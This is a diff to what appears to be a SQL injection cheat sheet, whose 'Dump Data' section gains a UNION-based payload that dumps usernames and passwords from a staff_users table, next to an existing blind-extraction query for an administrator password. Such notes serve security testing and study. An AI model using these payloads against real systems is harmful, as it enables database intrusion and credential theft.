@@ -180,7 +180,8 @@ SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table
 ```
 **Dump Data:**  
 ```sql  
-SELECT SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1);  
+SELECT SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1);
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users;--  
 ```
 ---
 
